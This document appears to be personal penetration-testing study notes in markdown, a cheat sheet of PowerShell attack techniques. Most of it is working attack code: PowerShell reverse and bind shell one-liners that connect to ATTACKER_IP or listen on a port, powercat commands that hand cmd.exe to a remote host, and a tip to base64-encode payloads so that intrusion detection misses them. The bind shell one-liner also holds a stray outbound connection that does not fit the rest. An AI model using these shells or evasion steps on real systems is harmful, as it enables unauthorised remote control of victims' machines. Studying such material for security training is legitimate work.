# Powershell

* Set `ExecutionPolicy` to `Unrestricted`, run `powershell` as admin:
```
Set-ExecutionPolicy Unrestricted
Y
```

* Check `ExecutionPolicy` status:
```
Get-ExecutionPolicy
```

* Comments in `powershell` scripts using `#`, `<#` and `#>`
```powershell
# This is a comment
<#
This is inside a block comment
#>
```

* File Transfer / Downloading with powershell, `new-object` instantiates a new `.NET` framework or `.COM` object, in our case, we are creating an instance of `WebClient` under the namespace of `System.Net`. This class contains a public function, `DownloadFile`, which takes two parameters, source location in the form of a `URI`, and a target location. (where the downloaded file will be stored)
```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://localhost/file','C:\Users\saccharide\Desktop\file')"
```

## Bind Shell & Reverse Shell
* A `bind shell` is when the victim binds `/bin/bash` to a port and is listening on its machine for attacker to connect to it and run command, but this is mostly likely blocked by firewall since the attacker is coming from the outside world, and is viewed as insecure network. This leds to `reverse shell`.
* A `reverse shell` is when the attacker creates a server and makes the victim connects to the attacker's machine. By defualt, firewalls are configured to deny access from insecure network (attacker's) to secure network (victim's), but they allow access from secure network to the insecure network. This means we can makes the victim to initiate the connection to attacker, and executes `/bin/bash` upon established connection.

## Reverse Shell!
* `iex` executes the string as command, similar to running `bash -c` or `powershell -c`, running command 
```
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',1337);

$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}

$client.Close();
```

Final setup:
```
Attacker:
nc -lvnp 1337

Victim:
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"
```

## Bind Shells
* Bind shell 
```
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',1337);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte, 0, $sendbyte.Length);
    $stream.Flush();
}

$client.Close();
$listener.Stop();
```

* Final Setup
```
Attacker:
nc -nv VICTIM_IP 1337

Victim:
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',1337); $listener.start();$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop();"
```

## Powercat
* `powercat` is essentially the Windows' verison of `netcat`.
* Dot-Soucring, kind of like loading `.bashrc`, will only be avaiable for the current powershell session, and will need to be reloaded every time if want to use.
```
. .\powercat.ps1
powercat -h
```

### File Transfer
* `-c` client mode, and we will need to specify the receiver's IP, `-p` will need the receiver's port number, `-i` specifies the local input file we want to transfer
```
Reciver:
nc -lnvp 1337 > receive.ps1

Sender:
powercat -c RECEIVER_IP -p RECEIVER_PORT -i C:\Users\saccharide\powercat.ps1
```

### Reverse shell
* Again, `reverse shell` is where the attacker starts a listener, and makes the victim initiate the connection
```
Attacker:
nc -lnvp 1337

Victim:
powercat -c ATTACKER_IP -p 1337 -e cmd.exe
```

### Bind Shell
* Again, `bind shell` is where the victim starts the listener and wait for attacker to connect to it to run shell commands.
```
Attacker:
nc -nv VICTIM_IP 1337

Victim:
powercat -l -p 1337 -e cmd.exe
```

### Stand-Alone Payloads
* `-g` option will generate a payload and we can redirect the output of this to a file, and powershell can run the generated payload directly
```
Attacker:
nc -lnvp 1337

Vitcim:
powercat -c ATTACKER_IP -p 1337 -e cmd.exe -g > reverse-shell.ps1
./reverse-shell.ps1
```

* Since most `IDS` will be able to detect such simple payload, we can encode it to `base64` with `-e` option, and we can use run it with `powershell -E`
```
Attacker:
nc -lnvp 1337

Vitcim:
powercat -c ATTACKER_IP -p 1337 -e cmd.exe -ge > reverse-shell.ps1
powershell.exe -E CONTENT_OF_REVERSE-SHELL.ps1
```
